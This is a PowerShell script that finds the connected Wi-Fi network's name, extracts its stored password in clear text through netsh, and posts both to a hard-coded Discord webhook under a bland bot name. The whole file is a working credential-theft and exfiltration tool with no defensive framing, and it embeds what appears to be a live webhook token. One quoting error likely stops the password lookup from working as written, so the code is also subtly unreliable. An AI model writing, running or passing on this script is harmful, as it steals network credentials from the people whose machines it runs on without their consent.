# send-wifi-to-discord.ps1
$webhook = 'https://discord.com/api/webhooks/1435247462758617129/Ar2MZy15aqzxhgd5PayvEnZsB4gvrR2HRWUpvBELXZyChiD6w0CZkTnaQ1SaX4JysM48'

# Get connected SSID
$ssid = (netsh wlan show interfaces |
         Select-String '^\s*SSID\s*:\s*(.+)$' |
         ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })
if (-not $ssid) { Write-Host "No SSID"; exit }

# Escape single quotes in SSID for safe netsh usage
$ssidEscaped = $ssid -replace "'", "''"

# Get stored Wi-Fi password (may require admin)
$pw = (netsh wlan show profile name='$ssidEscaped' key=clear |
       Select-String 'Key Content\s*:\s*(.+)$' |
       ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })

if (-not $pw) { $pw = "<not-found-or-needs-admin>" }

# Build and send payload
$content = "SSID: $ssid`nPASS: $pw"
$payload = @{ content = $content; username = 'NetInfoBot' } | ConvertTo-Json
Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json'